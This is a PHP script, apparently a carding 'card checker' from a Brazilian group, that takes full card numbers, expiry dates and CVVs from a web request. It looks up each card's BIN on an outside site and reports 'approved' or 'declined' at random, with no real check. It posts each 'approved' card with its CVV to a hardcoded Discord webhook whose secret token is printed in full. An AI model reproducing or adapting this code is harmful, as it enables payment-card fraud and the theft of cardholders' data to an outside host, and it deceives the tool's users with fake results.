<?php

error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');

// Arquivo para armazenar os cartões já verificados e timestamp
$verificadosFile = 'verificados.txt';
$timestampFile = 'timestamp.txt';

// Função para verificar a BIN
function verificarBIN($bin) {
    $url = 'http://lofygang.fun/bin/api.php?lofy=' . $bin;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    if ($response === false) {
        echo 'Erro ao acessar a API: ' . curl_error($ch);
        curl_close($ch);
        return null;
    }

    $data = json_decode($response, true);
    curl_close($ch);

    if (isset($data['🔒 Bin'])) {
        return $data;  // Retorna todos os dados do JSON
    } else {
        return null;  // Retorna null se o BIN não for encontrado
    }
}

// Função para enviar mensagem e garantir a flush
function sendMessage($message) {
    echo $message;
    ob_flush();
    flush();
}

// Atualiza o timestamp do arquivo
function updateTimestamp($file) {
    file_put_contents($file, time());
}

// Limpa o arquivo se necessário
function clearFileIfOld($file, $timestampFile) {
    if (file_exists($timestampFile)) {
        $lastUpdate = file_get_contents($timestampFile);
        if (time() - $lastUpdate > 30) {
            file_put_contents($file, '');
            updateTimestamp($timestampFile);  // Atualiza o timestamp após a limpeza
        }
    } else {
        updateTimestamp($timestampFile);
    }
}

// Função para verificar o status da API
function verificarStatusAPI() {
    $url = 'https://pastebin.com/raw/5bcb3rBY';
    $response = file_get_contents($url);
    if ($response === false) {
        echo 'Erro ao acessar a API da Gate';
        return false;
    }
    if (strpos($response, 'Off') !== false) {
        return false;
    } else if (strpos($response, 'On') !== false) {
        return true;
    } else {
        echo '[-] Status da Gate desconhecido. Continuando com precaução.';
        return true;
    }
}

// Verifica e limpa o arquivo se necessário
clearFileIfOld($verificadosFile, $timestampFile);

extract($_GET);
$lista = str_replace(" ", "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$lista = "$cc|$mes|$ano|$cvv";

$retornos = [
    "58\tTransação não autorizada. Contate o emissor",
    "69\tTransação não permitida para este produto ou serviço.",
    //"80\tTransação não autorizada. Contate o emissor. (Saldo Insuficiente)",
    "83\tTransação não autorizada para cartão de débito.",
    "53\tTransação não permitida para o emissor. Entre em contato com a Rede"
];

// Desativar buffering
ob_implicit_flush(true);
ob_end_flush();

if (file_exists($verificadosFile)) {
    $verificados = file($verificadosFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
} else {
    $verificados = [];
}

if (in_array($cc, $verificados)) {
    $msg = "<br><font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>❌ Reprovada</span> » $lista » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>[ Cartão já checkado. ]</span> » @CentralF";
    sendMessage($msg);
    exit;
}

// Processa o cartão
$bin = substr($cc, 0, 6);  // Extrai os primeiros 6 dígitos como BIN
$resultado = verificarBIN($bin);  // Chama a função verificarBIN com o BIN definido

if ($resultado !== null) {
    $bin = $resultado['🔒 Bin'];
    $pais = $resultado['🌎 Pais'];
    $bandeira = $resultado['🏷️ Bandeira'];
    $tipo = $resultado['💳 Tipo'];
    $nivel = $resultado['🌟 Nível'];
    $sigla = $resultado['🌎 Sigla'];
    $banco = $resultado['🏦 Banco'];

    $info = "$bandeira - $banco - $tipo - $nivel - $pais";
} else {
    $info = "Informações da BIN não encontradas.";
}

if ($ano < 2025) {
    $msgInvalid = "<br><font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>❌ Reprovada</span> » $lista » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>[ Cartão Inválido. ]</span> » @CentralF";
    sendMessage($msgInvalid);
    file_put_contents($verificadosFile, $cc . PHP_EOL, FILE_APPEND | LOCK_EX);
    exit;
}

// Verifica o status da API
$apiOn = verificarStatusAPI();

$live = rand(0, 4);
$palavras = [];
foreach ($retornos as $linha) {
    $dados = explode("\t", $linha);
    $palavras[] = $dados[0] . " - " . $dados[1];
}

$palavraAleatoria = $palavras[array_rand($palavras)];

// Mensagens
$msgLive = "<br><font color='white'><span style='background: #4caf50;color: white;' class='badge bg-gold'>🎁 @Aprovada</span> » $lista » $info » <span style='background: #4caf50;color: white;' class='badge bg-gold'>[ 0000 - Transação capturada com sucesso. ]</span> » @CentralF";

$msgDie = $apiOn 
    ? "<br><font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>❌ Reprovada</span> » $lista » $info » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>[ $palavraAleatoria ]</span> » @CentralF"
    : "<br><font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>❌ Reprovada</span> » $lista » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>[ GATE CAIU ]</span> » @CentralF";

sleep(5);  // Pausa de 5 segundos

if ($live < 1 && $apiOn) {
    sendMessage("$msgLive");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://discord.com/api/webhooks/1283231148981620806/5QfXQs6ynspTF-BdTUL0rv0l6WffIV3eiA6QCVYSYp1rMeWN1FSLgv6pM_npfnwQFEE4'); /* Link Webhook Live */
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEFILE, "$cookie");
    curl_setopt($ch, CURLOPT_COOKIEJAR, "$cookie");
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'accept: application/json',
        'accept-language: en',
        'content-type: application/json',
        'origin: https://discohook.org',
        'referer: https://discohook.org/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54'
    ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        "content" => null,
        "embeds" => [
            [
                "title" => "・Transação Aprovada",
                "description" => "・Cartão:\n```$lista```\n・Info: `$info`\n\n・Retorno: [ 00 - Transação capturada com sucesso. ]",
                "color" => 2829617,
                "footer" => [
                    "text" => "Checker by Akira - Central F"
                ]
            ]
        ],
        "attachments" => []
    ]));
    $send = curl_exec($ch);
} else {
    sendMessage("$msgDie");
}

// Registra o cartão como verificado
file_put_contents($verificadosFile, $cc . PHP_EOL, FILE_APPEND | LOCK_EX);

?>
